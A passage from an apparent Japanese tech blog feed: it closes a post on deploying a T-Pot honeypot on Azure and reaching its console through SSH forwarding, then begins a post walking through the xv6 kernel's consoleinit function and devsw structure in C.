&lt;p&gt;次に、以下のようにブラウザの&lt;code class=&quot;language-text&quot;&gt;SOCKS v5&lt;/code&gt;プロキシの設定を、ローカルホストと設定したフォワーディングポートにします。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/fec6a1243e2d96b99bcf05bf3f5161bc/0b533/image-31-164640099658235.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 59.166666666666664%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAARlAAAEZQAGA43XUAAABWklEQVQoz5VT0W6DMAzM/3/Vnveyva1Sh1YYEQMKCSRQQhNudlY6aVLpGunkRJHPd7EjsizD226HPJf4zHOkaQYpc+SywUfyBKOfwWtZAmG5C6G1BpMqiuM4wlgDa0dYU0GrBM75C+HyP8LB9ijLEmVVoa5rFEVB5ERqJFTzSoQBjyzxsq/J5iFaTtMU70kCpdRFFeD9GefzNoIP171QZiKFX4QqWp6mCZNzmOeZsMZttKrFMAwxX6xSvfdo2xbH4zFa58hgtZ4U8P0thPB7L1hR0zTg5jhSxrKdm+Oeq/N5i4zR93105twEwQnW2qvk8XSiij6OCVe+934MzmOOaJmTuAITcre5y9rO0D0XsZTg7yrkXHbYG0NjQ6zxQKQVjQ4P9UHWyGQRCR9dYpW8YohxiO/Bg8oOtrCEBY7eWnddnA7RdT11s4kN+Lt+km7/inD5jmz7RE3h+A3BFqb6TQ3ydwAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/fec6a1243e2d96b99bcf05bf3f5161bc/8ac56/image-31-164640099658235.webp 240w,
/static/fec6a1243e2d96b99bcf05bf3f5161bc/d3be9/image-31-164640099658235.webp 480w,
/static/fec6a1243e2d96b99bcf05bf3f5161bc/b0a15/image-31-164640099658235.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/fec6a1243e2d96b99bcf05bf3f5161bc/8ff5a/image-31-164640099658235.png 240w,
/static/fec6a1243e2d96b99bcf05bf3f5161bc/e85cb/image-31-164640099658235.png 480w,
/static/fec6a1243e2d96b99bcf05bf3f5161bc/0b533/image-31-164640099658235.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/fec6a1243e2d96b99bcf05bf3f5161bc/0b533/image-31-164640099658235.png&quot;
            alt=&quot;image-31.png&quot;
            title=&quot;image-31.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;これで踏み台サーバ経由でT-PotマシンのローカルIPアドレスに接続できるようになります。&lt;/p&gt;
&lt;p&gt;実際にブラウザで&lt;code class=&quot;language-text&quot;&gt;https://&amp;lt;T-PotのローカルIPアドレス&gt;:64297&lt;/code&gt;などに接続することでコンソールを開くことができます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/649eec9e8fe1936c330106e802345168/0b533/image-32-164640099891937.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 76.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACaElEQVQ4y3WTy26bQBSG2VayMTADA5iBwYCJcqkVJ4DvWVTuIokqdV9VUTZ9gb5Ua2XTPODfw9hxLCdZfPrH45n/XOZgjC9OsZg2mF2P0YxHOB1myFSMNI6QRCHUB+j/ZB+DRJJGKIshztMAxmIxR103aKoKs8kE8/kcy9UNqmZO6wWayXTL1TWa6wp1M9Hnq7qm/Yk+M65qXFxVqM5LGDLqo9/vIySCMITneWCMafhObduGZVmwiVZ7pglzR6fbhej2EHyyELIOjERKRFGEIAi02TGu6+4DHNIGaTFtC5nloTB9RF4PRhj4+4uee2C2W3PO4TjOq5mz1XZvnzmZdkiVZ8EQnktmR5m5R9k57EPdZmrB7NlQggx9fdH7uFyHvVvyIY5jHxq6b8slhBD7DF9KbvU9GHNgWjZSbSg85HmBYVEgTVPESbLvTZdesFXOXvvY9vQ4Q84ZLIcjCx0Y2SBFlucYjUZYLpd6DmezGaY0e9PZHKdnZ4jjmILmGAwGkDQVSZzovReSJEYkE3zOIxjDoj2Y4eHhAc/Pz9hsNnh6esJf0n+bP3j8+UNn3TS1DlpQJUqpN8hEYVTEMIo8Q1mWWK1WuL+/x+3tLe7u7vB1vcb6129crr9BhgFloYhEX271EKUSRDEZ5pIyJMOTkxPdQ0kDLneDHvoC8ZfvUPUNUvpW2/6mqUKq3oH2Ywp4OaQMfT8A93y4wocIQk27Zq4A63bgWD3Y3IPNXDjt43B3D9PQ8NOE9JiHYeTBKCW9Mi2KSBCkUiALOIZ9jiIWyPsuyph+t+ekj0HoEhxpwDTK36oUDJeK4z+SDpshgEFNLAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/649eec9e8fe1936c330106e802345168/8ac56/image-32-164640099891937.webp 240w,
/static/649eec9e8fe1936c330106e802345168/d3be9/image-32-164640099891937.webp 480w,
/static/649eec9e8fe1936c330106e802345168/b0a15/image-32-164640099891937.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/649eec9e8fe1936c330106e802345168/8ff5a/image-32-164640099891937.png 240w,
/static/649eec9e8fe1936c330106e802345168/e85cb/image-32-164640099891937.png 480w,
/static/649eec9e8fe1936c330106e802345168/0b533/image-32-164640099891937.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/649eec9e8fe1936c330106e802345168/0b533/image-32-164640099891937.png&quot;
            alt=&quot;image-32.png&quot;
            title=&quot;image-32.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;T-Potコンソールもカッコいい！！&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33-164640100164239.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 75.83333333333333%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAARlAAAEZQAGA43XUAAACPUlEQVQ4y61T227TQBCdtdfx3Y6dOEnj0OZGYqemqIibRGhaGokH/gAkXnkF/oBP4J1/PcxsUhFSJF76MFrv7pkzZ45niYjwoKFI/RekjvaaLBPHOFu4nIMLpdRfSfZR0r+Ky5m1P98XeeCW7z7ipI3pvEIUhuh2uhgOh3BdF49GI8RxjDzPUZYlAt9HGAfIsjafdQwuTdMDD/dtTpcNPn/5ygQlVqsVrq6ukHdyrN+8xngyQV3X2Gw26Pf6yLsx6lWFpmmwXq+xmD8+tGzHbHG0LG3UZFmGXr+P0PGwaJdIksQoHAwG8DwPpF0E3Iko6zNOcu61HPoRxuM5ZrMZzlfnWN9s0BRj/Hr/Hc2yxvmTBjfX10zQg3VacUc1VlVlOlkulvcVOkrD0hrato13osS2bMTah8/foqIoCnMnY2QzznEceOyp0vYfhfpgFKyjNdAeXk2fY86qLy8vsb3dYtAf3JvRJXXQJm+Xd0ptzFUPIWkzR+pwDpUFv+UZhUEUIslS2I6Gz1ghEFyLbMwpR8p7j9VTk8xwsbjFU2sEh9XKhYA9Tgpol2yb4SW8pTN8oAoVFXhBIxbhGAGCcdmyPOLx+Xj9CT++/URNJ6bijOU/oxJiRUQtZHtyKfKOZthwJOTihCIu6BiMs39VqReCXvpTbNsX6KrQJIoabZS67E2BM7ZkSDG6FBiimAmkTQmXQ0hHlCBWfBdGoNb+pwiRgKSarEI+oYwV+mYvbRUUouTkO++EULwWlfKmZRJ+A3asU7y3MdUnAAAAAElFTkSuQmCC&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/8ac56/image-33-164640100164239.webp 240w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/d3be9/image-33-164640100164239.webp 480w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/b0a15/image-33-164640100164239.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/8ff5a/image-33-164640100164239.png 240w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/e85cb/image-33-164640100164239.png 480w,
/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33-164640100164239.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/f0ab2d6a94b5abd4c24262218ad0c256/0b533/image-33-164640100164239.png&quot;
            alt=&quot;image-33.png&quot;
            title=&quot;image-33.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;とりあえず今回やったことは以下です。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;AzureにT-Potと踏み台サーバを構築&lt;/li&gt;
&lt;li&gt;T-Potマシンに Cloud One Wordload Security の Agentをインストールして、SentinelとSIEM連携&lt;/li&gt;
&lt;li&gt;踏み台サーバのSSHフォワーディング経由でT-Potコンソールに接続(後にオンプレ仮想マシンから直接接続する方法に構成を変更)&lt;/li&gt;
&lt;li&gt;T-Potのコンソールログインを確認&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;まだT-Potマシンのセキュリティグループのインバウンドポートは解放していないので、実際には稼働していない状況です。&lt;/p&gt;
&lt;p&gt;T-Potに含まれるどのハニーポットを使用するか、Azure Sentinelでどんな解析をしていくかなども含めてこれから決めていきたいと思います。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/34tqh58&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;サイバー攻撃の足跡を分析する ハニーポット観察記録 [ハニーポット観察記録]&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/34tPAnt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;WOWHoneypotの遊びかた　“おもてなし”機能でサイバー攻撃を観察する！&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -画面描画 編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのカーネルのmain関数の挙動を読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-010-kernel-main-07</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-010-kernel-main-07</guid><pubDate>Fri, 11 Feb 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;/unix-xv6-009-kernel-main-06&quot;&gt;前回&lt;/a&gt;は&lt;code class=&quot;language-text&quot;&gt;main&lt;/code&gt;関数で実行される&lt;code class=&quot;language-text&quot;&gt;picinit&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;ioapicinit&lt;/code&gt;関数の動きを確認しました。&lt;/p&gt;
&lt;p&gt;今回は&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数の挙動を追っていきます。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#consoleinit%E9%96%A2%E6%95%B0&quot;&gt;consoleinit関数&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#devsw%E6%A7%8B%E9%80%A0%E4%BD%93%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot;&gt;devsw構造体について&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#inode%E3%81%A8%E3%81%AF&quot;&gt;inodeとは&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#consolewrite%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;consolewrite関数を読む&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%93%E3%83%87%E3%82%AA%E3%83%A1%E3%83%A2%E3%83%AA%E3%81%AE%E6%9B%B8%E3%81%8D%E8%BE%BC%E3%81%BF&quot;&gt;ビデオメモリの書き込み&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#consoleread%E9%96%A2%E6%95%B0%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;consoleread関数を読む&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;consoleinit関数&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#consoleinit%E9%96%A2%E6%95%B0&quot; aria-label=&quot;consoleinit関数 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;consoleinit関数&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数は&lt;code class=&quot;language-text&quot;&gt;console.c&lt;/code&gt;で以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;consoleinit&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;initlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lock&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;console&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consolewrite&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;read &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consoleread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  cons&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;locking &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;token function&quot;&gt;ioapicenable&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;IRQ_KBD&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;まず1行目の&lt;code class=&quot;language-text&quot;&gt;initlock(&amp;amp;cons.lock, &quot;console&quot;);&lt;/code&gt;ですが、これは&lt;a href=&quot;/unix-xv6-004-kernel-main-01&quot;&gt;メモリ割り当て・排他制御 編&lt;/a&gt;で確認したメモリロックのために&lt;code class=&quot;language-text&quot;&gt;spinlock&lt;/code&gt;構造体を初期化する関数でした。&lt;/p&gt;
&lt;p&gt;今回使用している&lt;code class=&quot;language-text&quot;&gt;&amp;amp;cons.lock&lt;/code&gt;は、以下のように定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;spinlock&lt;/span&gt; lock&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; locking&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; cons&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;なお、&lt;code class=&quot;language-text&quot;&gt;consoleinit&lt;/code&gt;関数の中ではメモリロックは行われません。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;consoleread&lt;/code&gt;関数や&lt;code class=&quot;language-text&quot;&gt;consolewrite&lt;/code&gt;関数などが実行される際に、&lt;code class=&quot;language-text&quot;&gt;cons&lt;/code&gt;が使われてメモリロックが行われます。&lt;/p&gt;
&lt;p&gt;続いて、以下の行を見ていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;write &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consolewrite&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;CONSOLE&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;read &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; consoleread&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ここで参照している&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;は&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体の配列であり、この配列は&lt;code class=&quot;language-text&quot;&gt;file.c&lt;/code&gt;で定義されています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;devsw&lt;/span&gt; devsw&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;NDEV&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;devsw&lt;/code&gt;構造体の定義は&lt;code class=&quot;language-text&quot;&gt;file.h&lt;/code&gt;で行われています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;// table mapping major device number to&lt;/span&gt;
&lt;span class=&quot;token comment&quot;&gt;// device functions&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;devsw&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;read&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token 